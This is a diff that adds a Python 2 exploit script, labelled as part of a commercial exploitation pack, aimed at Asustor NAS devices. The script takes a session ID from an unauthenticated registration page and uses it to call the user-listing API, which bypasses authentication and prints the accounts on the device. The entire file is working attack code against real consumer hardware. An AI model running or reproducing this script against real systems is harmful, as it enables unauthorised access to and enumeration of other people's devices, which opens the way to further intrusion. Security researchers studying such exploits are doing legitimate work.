@@ -1,0 +1,58 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_asustor_1'
+_vendor_ = 'asustor'
+_model_  = ['NAS']
+_vuln_   = 'Authentication Bypass Vulnerability'
+_cve_    = ''
+_ref_    = 'https://blogs.securiteam.com/index.php/archives/3747'
+_port_   = 8000
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/initial/index.cgi?act=register' % (host,port)    
+    response = requests.get(url)
+    m =re.search('SID = \'([^\']+)\';', response.text)
+    if m is None:
+      print '[+] %s not vulnerable' % host
+      return
+    sid = m.group(1)
+    url = 'http://%s:%d/portal/apis/accessControl/user.cgi?sid=%s&act=list&domain=0&version=1' % (host,port,sid)
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    data = 'key=&sort=NAME&ascend=1&page=1&start=0&limit=20'
+    response = requests.post(url, headers=headers, data=data)                    
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    return
+  if '{ "success": true, "total":' in response.text:
+    print '[+] %s vulnerable\n' % host
+    m = re.findall('"name": "([^"]+)"', response.text)
+    if m is None:
+      print '[+] Users not found'
+      print response.text        
+    else:           
+      print 'List of usernames:' 
+      for n in m:
+        print '+ %s'%n
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
